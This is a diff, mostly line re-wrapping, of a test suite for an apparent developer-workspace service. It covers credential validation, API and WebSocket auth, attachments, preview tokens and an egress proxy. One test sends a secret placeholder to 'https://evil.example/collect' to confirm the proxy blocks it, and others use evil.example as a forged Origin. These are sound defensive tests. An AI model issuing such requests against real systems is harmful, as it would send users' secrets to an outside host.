   });
 });
 
@@ -839,8 +1093,16 @@ describe("credentials (02, Credentials)", () => {
   it("setClaudeToken rejects spaces, short and over-long tokens with VALIDATION_FAILED", async () => {
     // 02: `{token}`: no spaces, 20 to 4096 chars.
     const o = await owner();
-    for (const token of ["sk-ant-oat01 abcdefghijklmnop", "short-token-123", "x".repeat(19), "x".repeat(4097), ""]) {
-      expect(codeOf(await call("setClaudeToken", o, { token })), token.slice(0, 30)).toBe("VALIDATION_FAILED");
+    for (const token of [
+      "sk-ant-oat01 abcdefghijklmnop",
+      "short-token-123",
+      "x".repeat(19),
+      "x".repeat(4097),
+      "",
+    ]) {
+      expect(codeOf(await call("setClaudeToken", o, { token })), token.slice(0, 30)).toBe(
+        "VALIDATION_FAILED",
+      );
     }
     expect(await env.CREDENTIALS.getByName(o.userId).getSecret("claude.oauth_token")).toBeNull();
     ok(await call("setClaudeToken", o, { token: "x".repeat(20) }));
@@ -886,7 +1148,9 @@ describe("credentials (02, Credentials)", () => {
     const o = await owner();
     expect(codeOf(await call("setApiKey", o, { provider: "mistral", key: "k" }))).toBe("VALIDATION_FAILED");
     expect(codeOf(await call("setApiKey", o, { provider: "openai", key: "" }))).toBe("VALIDATION_FAILED");
-    expect(codeOf(await call("setApiKey", o, { provider: "openai", key: "sk two parts" }))).toBe("VALIDATION_FAILED");
+    expect(codeOf(await call("setApiKey", o, { provider: "openai", key: "sk two parts" }))).toBe(
+      "VALIDATION_FAILED",
+    );
     expect(await env.CREDENTIALS.getByName(o.userId).getSecret("openai.api_key")).toBeNull();
   });
 
@@ -916,7 +1180,10 @@ describe("credentials (02, Credentials)", () => {
   it("setProjectSecret returns VALIDATION_FAILED for names outside the pattern", async () => {
     const o = await owner();
     for (const name of ["api_key", "1ABC", "A-B", "A B", "", "ÄPI"]) {
-      expect(codeOf(await call("setProjectSecret", o, { projectId: o.projectId, name, value: "v" })), name).toBe("VALIDATION_FAILED");
+      expect(
+        codeOf(await call("setProjectSecret", o, { projectId: o.projectId, name, value: "v" })),
+        name,
+      ).toBe("VALIDATION_FAILED");
     }
     expect(await env.CREDENTIALS.getByName(o.userId).listProjectEnvNames(o.projectId)).toEqual([]);
   });
@@ -924,9 +1191,13 @@ describe("credentials (02, Credentials)", () => {
   it("setProjectSecret and listProjectSecretNames return NOT_FOUND for another user's project", async () => {
     const o = await owner();
     const other = await owner();
-    expect(codeOf(await call("setProjectSecret", o, { projectId: other.projectId, name: "A", value: "v" }))).toBe("NOT_FOUND");
+    expect(
+      codeOf(await call("setProjectSecret", o, { projectId: other.projectId, name: "A", value: "v" })),
+    ).toBe("NOT_FOUND");
     expect(codeOf(await call("listProjectSecretNames", o, { projectId: other.projectId }))).toBe("NOT_FOUND");
-    expect(codeOf(await call("deleteProjectSecret", o, { projectId: other.projectId, name: "A" }))).toBe("NOT_FOUND");
+    expect(codeOf(await call("deleteProjectSecret", o, { projectId: other.projectId, name: "A" }))).toBe(
+      "NOT_FOUND",
+    );
   });
 
   it("setProjectSecret and deleteProjectSecret send env.set to the project's live workspaces", async () => {
@@ -935,12 +1206,25 @@ describe("credentials (02, Credentials)", () => {
     const { stub, tempod } = await seedWorkspace(o);
     await driveReady(stub);
     const sentBefore = tempod.requestsOf("env.set").length;
-    ok(await call("setProjectSecret", o, { projectId: o.projectId, name: "STRIPE_KEY", value: "sk_test_123" }));
-    await waitFor(() => tempod.requestsOf("env.set").length > sentBefore, 5000, "env.set after setProjectSecret");
-    expect(tempod.requestsOf("env.set").at(-1).env).toMatchObject({ STRIPE_KEY: "sk_test_123", TEMPO_PORT: "3000" });
+    ok(
+      await call("setProjectSecret", o, { projectId: o.projectId, name: "STRIPE_KEY", value: "sk_test_123" }),
+    );
+    await waitFor(
+      () => tempod.requestsOf("env.set").length > sentBefore,
+      5000,
+      "env.set after setProjectSecret",
+    );
+    expect(tempod.requestsOf("env.set").at(-1).env).toMatchObject({
+      STRIPE_KEY: "sk_test_123",
+      TEMPO_PORT: "3000",
+    });
     const afterSet = tempod.requestsOf("env.set").length;
     ok(await call("deleteProjectSecret", o, { projectId: o.projectId, name: "STRIPE_KEY" }));
-    await waitFor(() => tempod.requestsOf("env.set").length > afterSet, 5000, "env.set after deleteProjectSecret");
+    await waitFor(
+      () => tempod.requestsOf("env.set").length > afterSet,
+      5000,
+      "env.set after deleteProjectSecret",
+    );
     expect(tempod.requestsOf("env.set").at(-1).env).not.toHaveProperty("STRIPE_KEY");
   });
 
@@ -954,7 +1238,9 @@ describe("credentials (02, Credentials)", () => {
     expect(listed).toEqual({ names: ["ALPHA", "ZED"] });
     expect(JSON.stringify(listed)).not.toContain("secret");
     ok(await call("deleteProjectSecret", o, { projectId: o.projectId, name: "ZED" }));
-    expect(ok(await call("listProjectSecretNames", o, { projectId: o.projectId }))).toEqual({ names: ["ALPHA"] });
+    expect(ok(await call("listProjectSecretNames", o, { projectId: o.projectId }))).toEqual({
+      names: ["ALPHA"],
+    });
     expect(ok(await call("listProjectSecretNames", o, { projectId: second }))).toEqual({ names: ["OTHER"] });
   });
 });
@@ -974,7 +1260,12 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
     expect(res.status).toBe(200);
     const meta = (await res.json()) as Row;
     expect(conforms(ApiMeta, meta)).toBe(true);
-    expect(Object.keys(meta).sort()).toEqual(["latestMacClient", "minMacClient", "protocol", "serverVersion"]);
+    expect(Object.keys(meta).sort()).toEqual([
+      "latestMacClient",
+      "minMacClient",
+      "protocol",
+      "serverVersion",
+    ]);
     expect(meta).toMatchObject({ protocol: 1, latestMacClient: null });
     expect(meta["minMacClient"]).toMatch(/^\d+\.\d+\.\d+$/);
     await env.DATA.put("clients/mac/latest.json", JSON.stringify({ version: "0.4.2" }));
@@ -988,11 +1279,18 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
 
   it("POST /api/v1/rpc/<function> accepts a bearer token (AT-24)", async () => {
     const o = await owner();
-    const res = await v1("/api/v1/rpc/listProjects", { method: "POST", headers: { Authorization: `Bearer ${o.token}` }, body: "{}" });
+    const res = await v1("/api/v1/rpc/listProjects", {
+      method: "POST",
+      headers: { Authorization: `Bearer ${o.token}` },
+      body: "{}",
+    });
     expect(res.status).toBe(200);
     expect(((await res.json()) as Row[]).map((p) => p["id"])).toEqual([o.projectId]);
     // An empty body is the empty input.
-    const empty = await v1("/api/v1/rpc/listProjects", { method: "POST", headers: { Authorization: `Bearer ${o.token}` } });
+    const empty = await v1("/api/v1/rpc/listProjects", {
+      method: "POST",
+      headers: { Authorization: `Bearer ${o.token}` },
+    });
     expect(empty.status).toBe(200);
   });
 
@@ -1001,7 +1299,11 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
     const cookie = await sessionCookie(o.token);
     // The same cookie is a valid session for the web wrapper.
     expect(ok(await runFn("listProjects", env, new Headers({ Cookie: cookie }), {}, COOKIE))).toHaveLength(1);
-    const res = await v1("/api/v1/rpc/listProjects", { method: "POST", headers: { Cookie: cookie, Origin: APP_ORIGIN }, body: "{}" });
+    const res = await v1("/api/v1/rpc/listProjects", {
+      method: "POST",
+      headers: { Cookie: cookie, Origin: APP_ORIGIN },
+      body: "{}",
+    });
     expect(res.status).toBe(401);
     expect(((await res.json()) as ErrorBody).code).toBe("UNAUTHENTICATED");
   });
@@ -1010,17 +1312,29 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
     const none = await v1("/api/v1/rpc/listProjects", { method: "POST", body: "{}" });
     expect(none.status).toBe(401);
     const stranger = await seedStranger();
-    const res = await v1("/api/v1/rpc/listProjects", { method: "POST", headers: { Authorization: `Bearer ${stranger.token}` }, body: "{}" });
+    const res = await v1("/api/v1/rpc/listProjects", {
+      method: "POST",
+      headers: { Authorization: `Bearer ${stranger.token}` },
+      body: "{}",
+    });
     expect(res.status).toBe(403);
     expect(((await res.json()) as ErrorBody).code).toBe("FORBIDDEN");
   });
 
   it("returns 404 NOT_FOUND for an unknown function", async () => {
     const o = await owner();
-    const res = await v1("/api/v1/rpc/dropAllTables", { method: "POST", headers: { Authorization: `Bearer ${o.token}` }, body: "{}" });
+    const res = await v1("/api/v1/rpc/dropAllTables", {
+      method: "POST",
+      headers: { Authorization: `Bearer ${o.token}` },
+      body: "{}",
+    });
     expect(res.status).toBe(404);
     expect(((await res.json()) as ErrorBody).code).toBe("NOT_FOUND");
-    const proto = await v1("/api/v1/rpc/constructor", { method: "POST", headers: { Authorization: `Bearer ${o.token}` }, body: "{}" });
+    const proto = await v1("/api/v1/rpc/constructor", {
+      method: "POST",
+      headers: { Authorization: `Bearer ${o.token}` },
+      body: "{}",
+    });
     expect(proto.status).toBe(404);
   });
 
@@ -1029,7 +1343,11 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
     const headers = { Authorization: `Bearer ${o.token}` };
     const notJson = await v1("/api/v1/rpc/listWorkspaces", { method: "POST", headers, body: "{nope" });
     expect(((await notJson.json()) as ErrorBody).code).toBe("VALIDATION_FAILED");
-    const bad = await v1("/api/v1/rpc/linkProject", { method: "POST", headers, body: JSON.stringify({ installationId: "x" }) });
+    const bad = await v1("/api/v1/rpc/linkProject", {
+      method: "POST",
+      headers,
+      body: JSON.stringify({ installationId: "x" }),
+    });
     expect(bad.status).toBe(400);
     expect(((await bad.json()) as ErrorBody).code).toBe("VALIDATION_FAILED");
   });
@@ -1038,13 +1356,25 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
     const o = await owner();
     const { workspaceId } = await seedWorkspace(o);
     const headers = { Authorization: `Bearer ${o.token}` };
-    const mine = await v1("/api/v1/rpc/getWorkspace", { method: "POST", headers, body: JSON.stringify({ workspaceId }) });
+    const mine = await v1("/api/v1/rpc/getWorkspace", {
+      method: "POST",
+      headers,
+      body: JSON.stringify({ workspaceId }),
+    });
     expect(mine.status).toBe(200);
     const detail = await mine.json();
     expect(conforms(WorkspaceDetail, detail)).toBe(true);
     const other = await owner();
-    const theirs = await insertWorkspaceRow({ projectId: other.projectId, userId: other.userId, slug: "lisbon" });
-    const res = await v1("/api/v1/rpc/getWorkspace", { method: "POST", headers, body: JSON.stringify({ workspaceId: theirs }) });
+    const theirs = await insertWorkspaceRow({
+      projectId: other.projectId,
+      userId: other.userId,
+      slug: "lisbon",
+    });
+    const res = await v1("/api/v1/rpc/getWorkspace", {
+      method: "POST",
+      headers,
+      body: JSON.stringify({ workspaceId: theirs }),
+    });
     expect(res.status).toBe(404);
     expect(((await res.json()) as ErrorBody).code).toBe("NOT_FOUND");
   });
@@ -1057,7 +1387,10 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
       body: JSON.stringify({ installationId: o.installationId, repoId: o.repoId }),
     });
     expect(res.ok).toBe(false);
-    expect(await res.json()).toMatchObject({ code: "PROJECT_EXISTS", message: "This repo is already a project." });
+    expect(await res.json()).toMatchObject({
+      code: "PROJECT_EXISTS",
+      message: "This repo is already a project.",
+    });
   });
 });
 
@@ -1088,8 +1421,14 @@ describe("channel upgrades (02, Upgrade rules for all three channels; 07, WebSoc
   it("returns 403 for a wrong Origin, with or without a session", async () => {
     const o = await owner();
     expect((await upgrade("/api/ws/hub", { Origin: "https://evil.example" }))?.status).toBe(403);
-    expect((await upgrade("/api/ws/hub", { Origin: "https://evil.example", Cookie: await sessionCookie(o.token) }))?.status).toBe(403);
-    expect((await upgrade("/api/ws/hub", { Origin: "https://evil.example", Authorization: `Bearer ${o.token}` }))?.status).toBe(403);
+    expect(
+      (await upgrade("/api/ws/hub", { Origin: "https://evil.example", Cookie: await sessionCookie(o.token) }))
+        ?.status,
+    ).toBe(403);
+    expect(
+      (await upgrade("/api/ws/hub", { Origin: "https://evil.example", Authorization: `Bearer ${o.token}` }))
+        ?.status,
+    ).toBe(403);
   });
 
   it("returns 403 with no Origin and no bearer token", async () => {
@@ -1127,7 +1466,9 @@ describe("channel upgrades (02, Upgrade rules for all three channels; 07, WebSoc
   it("accepts a bearer upgrade on the workspace channel and sends hello (AT-25)", async () => {
     const o = await owner();
     const { workspaceId } = await seedWorkspace(o);
-    const res = (await upgrade(`/api/ws/workspace/${workspaceId}?sinceRev=0`, { Authorization: `Bearer ${o.token}` }))!;
+    const res = (await upgrade(`/api/ws/workspace/${workspaceId}?sinceRev=0`, {
+      Authorization: `Bearer ${o.token}`,
+    }))!;
     expect(res.status).toBe(101);
     const sock = accept(res);
     await waitFor(() => sock.messages.length > 0, 5000, "workspace hello");
@@ -1139,8 +1480,16 @@ describe("channel upgrades (02, Upgrade rules for all three channels; 07, WebSoc
   it("upgrades, then closes with 4404 for a workspace the user does not own", async () => {
     const o = await owner();
     const other = await owner();
-    const theirs = await insertWorkspaceRow({ projectId: other.projectId, userId: other.userId, slug: "lisbon" });
-    for (const path of [`/api/ws/workspace/${theirs}`, `/api/ws/terminal/${theirs}/t1`, `/api/ws/workspace/${newId()}`]) {
+    const theirs = await insertWorkspaceRow({
+      projectId: other.projectId,
+      userId: other.userId,
+      slug: "lisbon",
+    });
+    for (const path of [
+      `/api/ws/workspace/${theirs}`,
+      `/api/ws/terminal/${theirs}/t1`,
+      `/api/ws/workspace/${newId()}`,
+    ]) {
       const res = (await upgrade(path, { Authorization: `Bearer ${o.token}` }))!;
       expect(res.status, path).toBe(101);
       const sock = accept(res);
@@ -1154,7 +1503,11 @@ describe("channel upgrades (02, Upgrade rules for all three channels; 07, WebSoc
     const o = await owner();
     const { workspaceId } = await seedWorkspace(o);
     for (const id of ["t0", "t10", "x1", "T1"]) {
-      expect((await upgrade(`/api/ws/terminal/${workspaceId}/${id}`, { Authorization: `Bearer ${o.token}` }))?.status, id).toBe(404);
+      expect(
+        (await upgrade(`/api/ws/terminal/${workspaceId}/${id}`, { Authorization: `Bearer ${o.token}` }))
+          ?.status,
+        id,
+      ).toBe(404);
     }
   });
 });
@@ -1165,7 +1518,11 @@ describe("channel upgrades (02, Upgrade rules for all three channels; 07, WebSoc
 
 const postAttachment = (workspaceId: string, form: FormData, headers: Record<string, string>) =>
   handleAttachment(
-    new Request(`${APP_ORIGIN}/api/workspaces/${workspaceId}/attachments`, { method: "POST", headers, body: form }),
+    new Request(`${APP_ORIGIN}/api/workspaces/${workspaceId}/attachments`, {
+      method: "POST",
+      headers,
+      body: form,
+    }),
     env,
     workspaceId,
   );
@@ -1180,12 +1537,21 @@ describe("attachments (02, Sessions and turns: attachments route)", () => {
   it("stores one file at attachments/<workspaceId>/<attachmentId>/<file name> and returns {attachmentId, name, mime, size}", async () => {
     const o = await owner();
     const { workspaceId, stub } = await seedWorkspace(o);
-    const res = await postAttachment(workspaceId, formWith(new File(["hello world"], "notes.txt", { type: "text/plain" })), {
-      Authorization: `Bearer ${o.token}`,
-    });
+    const res = await postAttachment(
+      workspaceId,
+      formWith(new File(["hello world"], "notes.txt", { type: "text/plain" })),
+      {
+        Authorization: `Bearer ${o.token}`,
+      },
+    );
     expect(res.status).toBe(200);
     const body = (await res.json()) as Row;
-    expect(body).toEqual({ attachmentId: expect.stringMatching(ULID), name: "notes.txt", mime: "text/plain", size: 11 });
+    expect(body).toEqual({
+      attachmentId: expect.stringMatching(ULID),
+      name: "notes.txt",
+      mime: "text/plain",
+      size: 11,
+    });
     const key = `attachments/${workspaceId}/${body["attachmentId"]}/notes.txt`;
     const obj = await env.DATA.get(key);
     expect(await obj?.text()).toBe("hello world");
@@ -1197,7 +1563,9 @@ describe("attachments (02, Sessions and turns: attachments route)", () => {
   it("returns FILE_TOO_LARGE for a file over 10 MiB and stores nothing", async () => {
     const o = await owner();
     const { workspaceId } = await seedWorkspace(o);
-    const big = new File([new Uint8Array(10 * 1024 * 1024 + 1)], "big.bin", { type: "application/octet-stream" });
+    const big = new File([new Uint8Array(10 * 1024 * 1024 + 1)], "big.bin", {
+      type: "application/octet-stream",
+    });
     const res = await postAttachment(workspaceId, formWith(big), { Authorization: `Bearer ${o.token}` });
     expect(((await res.json()) as ErrorBody).code).toBe("FILE_TOO_LARGE");
     expect((await env.DATA.list({ prefix: `attachments/${workspaceId}/` })).objects).toHaveLength(0);
@@ -1206,9 +1574,13 @@ describe("attachments (02, Sessions and turns: attachments route)", () => {
   it("returns VALIDATION_FAILED unless exactly one file is sent", async () => {
     const o = await owner();
     const { workspaceId } = await seedWorkspace(o);
-    const two = await postAttachment(workspaceId, formWith(new File(["a"], "a.txt"), new File(["b"], "b.txt")), {
-      Authorization: `Bearer ${o.token}`,
-    });
+    const two = await postAttachment(
+      workspaceId,
+      formWith(new File(["a"], "a.txt"), new File(["b"], "b.txt")),
+      {
+        Authorization: `Bearer ${o.token}`,
+      },
+    );
     expect(((await two.json()) as ErrorBody).code).toBe("VALIDATION_FAILED");
     const none = new FormData();
     none.append("text", "not a file");
@@ -1222,13 +1594,25 @@ describe("attachments (02, Sessions and turns: attachments route)", () => {
     const file = () => formWith(new File(["x"], "x.txt"));
     const anon = await postAttachment(workspaceId, file(), {});
     expect(anon.status).toBe(401);
-    const origin = await postAttachment(workspaceId, file(), { Authorization: `Bearer ${o.token}`, Origin: "https://evil.example" });
+    const origin = await postAttachment(workspaceId, file(), {
+      Authorization: `Bearer ${o.token}`,
+      Origin: "https://evil.example",
+    });
     expect(((await origin.json()) as ErrorBody).code).toBe("FORBIDDEN");
     const other = await owner();
-    const theirs = await insertWorkspaceRow({ projectId: other.projectId, userId: other.userId, slug: "lisbon" });
+    const theirs = await insertWorkspaceRow({
+      projectId: other.projectId,
+      userId: other.userId,
+      slug: "lisbon",
+    });
     const notMine = await postAttachment(theirs, file(), { Authorization: `Bearer ${o.token}` });
     expect(((await notMine.json()) as ErrorBody).code).toBe("NOT_FOUND");
-    const archived = await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "porto", archivedAt: Date.now() });
+    const archived = await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "porto",
+      archivedAt: Date.now(),
+    });
     const res = await postAttachment(archived, file(), { Authorization: `Bearer ${o.token}` });
     expect(((await res.json()) as ErrorBody).code).toBe("WORKSPACE_ARCHIVED");
     expect((await env.DATA.list({ prefix: `attachments/${workspaceId}/` })).objects).toHaveLength(0);
@@ -1273,7 +1657,10 @@ describe("preview access (05, Preview access)", () => {
     const right = String(detail.previewToken);
     expect(right).toMatch(/^[a-z0-9]{16}$/);
     const wrong = right.startsWith("a") ? `b${right.slice(1)}` : `a${right.slice(1)}`;
-    for (const host of [`3000-${workspaceId}-${wrong}.previews.test`, `3000-${newId()}-${right}.previews.test`]) {
+    for (const host of [
+      `3000-${workspaceId}-${wrong}.previews.test`,
+      `3000-${newId()}-${right}.previews.test`,
+    ]) {
       const res = await previewGet(host);
       expect(res.status, host).toBe(404);
       expect(res.headers.get("Referrer-Policy")).toBe("no-referrer");
@@ -1285,7 +1672,12 @@ describe("preview access (05, Preview access)", () => {
     // A workspace from createWorkspace has no container in tests, so it never comes up.
     const o = await owner();
     const workspaceId = String(
-      ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } }))["id"],
+      ok(
+        await call("createWorkspace", o, {
+          projectId: o.projectId,
+          source: { kind: "new", baseBranch: "main" },
+        }),
+      )["id"],
     );
     const stub = env.WORKSPACE.getByName(workspaceId);
     const token = String(ok(await stub.getWorkspace({})).previewToken);
@@ -1308,11 +1700,16 @@ describe("preview access (05, Preview access)", () => {
 // ======================================================================
 
 const outbound = (workspaceId: string, userId: string) =>
-  (exports as unknown as { TempoOutbound: (o: { props: { workspaceId: string; userId: string } }) => Fetcher }).TempoOutbound({
+  (
+    exports as unknown as {
+      TempoOutbound: (o: { props: { workspaceId: string; userId: string } }) => Fetcher;
+    }
+  ).TempoOutbound({
     props: { workspaceId, userId },
   });
 
-const egressRows = (stub: DurableObjectStub<WorkspaceDO>) => doRows(stub, "SELECT * FROM egress_log ORDER BY id");
+const egressRows = (stub: DurableObjectStub<WorkspaceDO>) =>
+  doRows(stub, "SELECT * FROM egress_log ORDER BY id");
 
 /** Runs the create op until the workspace is ready (alarms may also fire on their own). */
 const driveReady = async (stub: DurableObjectStub<WorkspaceDO>): Promise<void> => {
@@ -1330,9 +1727,12 @@ describe("TempoOutbound (01, Credentials and egress; 05, Egress control)", () =>
     const o = await owner();
     const { workspaceId, stub } = await seedWorkspace(o);
     const before = gh.upstream.length;
-    const res = await outbound(workspaceId, o.userId).fetch("https://github.com/ACME/app.git/info/refs?service=git-upload-pack", {
-      headers: { "User-Agent": "git/2.45" },
-    });
+    const res = await outbound(workspaceId, o.userId).fetch(
+      "https://github.com/ACME/app.git/info/refs?service=git-upload-pack",
+      {
+        headers: { "User-Agent": "git/2.45" },
+      },
+    );
     expect(res.status).toBe(200);
     const sent = gh.upstream.slice(before).find((r) => r.url.hostname === "github.com");
     const basic = /^Basic (.+)$/.exec(sent?.headers.get("Authorization") ?? "");
@@ -1344,12 +1744,25 @@ describe("TempoOutbound (01, Credentials and egress; 05, Egress control)", () =>
     // 01: "The token is minted with repository_ids: [<repo id>]" and the six permissions.
     expect(minted!.body).toEqual({
       repository_ids: [o.repoId],
-      permissions: { contents: "write", pull_requests: "write", metadata: "read", checks: "read", actions: "read", issues: "read" },
+      permissions: {
+        contents: "write",
+        pull_requests: "write",
+        metadata: "read",
+        checks: "read",
+        actions: "read",
+        issues: "read",
+      },
     });
     // 01: log {ts, method, host, path, status, ms, rule}; path without the query string.
     await waitFor(async () => (await egressRows(stub)).length > 0, 5000, "egress_log row");
     const [row] = await egressRows(stub);
-    expect(row).toMatchObject({ method: "GET", host: "github.com", path: "/ACME/app.git/info/refs", status: 200, rule: 2 });
+    expect(row).toMatchObject({
+      method: "GET",
+      host: "github.com",
+      path: "/ACME/app.git/info/refs",
+      status: 200,
+      rule: 2,
+    });
     expect(typeof row!["ms"]).toBe("number");
   });
 
@@ -1393,18 +1806,31 @@ describe("TempoOutbound (01, Credentials and egress; 05, Egress control)", () =>
     const o = await owner();
     const { workspaceId, stub } = await seedWorkspace(o);
     const before = gh.upstream.length;
-    const res = await outbound(workspaceId, o.userId).fetch("https://tempo.test/api/v1/rpc/listProjects", { method: "POST", body: "{}" });
+    const res = await outbound(workspaceId, o.userId).fetch("https://tempo.test/api/v1/rpc/listProjects", {
+      method: "POST",
+      body: "{}",
+    });
     expect(res.status).toBe(403);
     expect(gh.upstream.slice(before).some((r) => r.url.hostname === "tempo.test")).toBe(false);
-    await waitFor(async () => (await egressRows(stub)).some((r) => r["host"] === "tempo.test"), 5000, "egress_log row");
-    expect((await egressRows(stub)).find((r) => r["host"] === "tempo.test")).toMatchObject({ status: 403, rule: 0, method: "POST" });
+    await waitFor(
+      async () => (await egressRows(stub)).some((r) => r["host"] === "tempo.test"),
+      5000,
+      "egress_log row",
+    );
+    expect((await egressRows(stub)).find((r) => r["host"] === "tempo.test")).toMatchObject({
+      status: 403,
+      rule: 0,
+      method: "POST",
+    });
   });
 
   it("rule 7: refuses a request that still carries the placeholder", async () => {
     const o = await owner();
     const { workspaceId } = await seedWorkspace(o);
     const before = gh.upstream.length;
-    const res = await outbound(workspaceId, o.userId).fetch("https://evil.example/collect", { headers: { "X-Key": PLACEHOLDER } });
+    const res = await outbound(workspaceId, o.userId).fetch("https://evil.example/collect", {
+      headers: { "X-Key": PLACEHOLDER },
+    });
     expect(res.status).toBe(403);
     expect(gh.upstream.slice(before).some((r) => r.url.hostname === "evil.example")).toBe(false);
   });
@@ -1432,7 +1858,12 @@ describe("TempoOutbound (01, Credentials and egress; 05, Egress control)", () =>
       sources: {},
     }));
     await stub.refreshSettings();
-    expect(await stub.getEgressConfig()).toMatchObject({ owner: "acme", repo: "app", policy: "allowlist", allowlist: ["*.example.com"] });
+    expect(await stub.getEgressConfig()).toMatchObject({
+      owner: "acme",
+      repo: "app",
+      policy: "allowlist",
+      allowlist: ["*.example.com"],
+    });
     const out = outbound(workspaceId, o.userId);
     const blocked = await out.fetch("https://example.com/");
     expect(blocked.status).toBe(403);
@@ -1456,14 +1887,22 @@ const setup = (pathAndQuery: string, init: RequestInit = {}) => {
 };
 
 const unescapeHtml = (s: string) =>
-  s.replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
+  s
+    .replace(/&quot;/g, '"')
+    .replace(/&#39;/g, "'")
+    .replace(/&lt;/g, "<")
+    .replace(/&gt;/g, ">")
+    .replace(/&amp;/g, "&");
 
 describe("GitHub App setup (05, Deployment and configuration: GitHub App setup)", () => {
   it("returns 404 once the GitHub App is configured, even with the token", async () => {
     const res = await setup(`/setup/github?token=${env.TEMPO_SETUP_TOKEN}`);
     expect(res.status).toBe(404);
     const status = (await (await handleSetupStatus(env)).json()) as Row;
-    expect(status).toEqual({ configured: true, installUrl: `https://github.com/apps/${APP.slug}/installations/new` });
+    expect(status).toEqual({
+      configured: true,
+      installUrl: `https://github.com/apps/${APP.slug}/installations/new`,
+    });
   });
 
   describe("while no App is configured", () => {
@@ -1529,7 +1968,9 @@ describe("GitHub App setup (05, Deployment and configuration: GitHub App setup)"
       const before = gh.requests.length;
       const res = await setup(`/setup/github/callback?code=abc123&state=${env.TEMPO_SETUP_TOKEN}`);
       expect(res.status).toBe(200);
-      const conv = gh.requests.slice(before).find((r) => r.url.pathname === "/app-manifests/abc123/conversions");
+      const conv = gh.requests
+        .slice(before)
+        .find((r) => r.url.pathname === "/app-manifests/abc123/conversions");
       expect(conv?.method).toBe("POST");
       const html = await res.text();
       expect(html).toContain("https://github.com/apps/tempo-tempo-test/installations/new");
@@ -1547,7 +1988,9 @@ describe("GitHub App setup (05, Deployment and configuration: GitHub App setup)"
       // The stored App mints tokens.
       gh.appId = "654321";
       const o = await owner();
-      gh.installations = [{ id: o.installationId, account: { login: "acme", type: "Organization" }, suspended_at: null }];
+      gh.installations = [
+        { id: o.installationId, account: { login: "acme", type: "Organization" }, suspended_at: null },
+      ];
       expect(ok(await call("listInstallations", o))).toEqual([
         { installationId: o.installationId, accountLogin: "acme", accountType: "Organization" },
       ]);
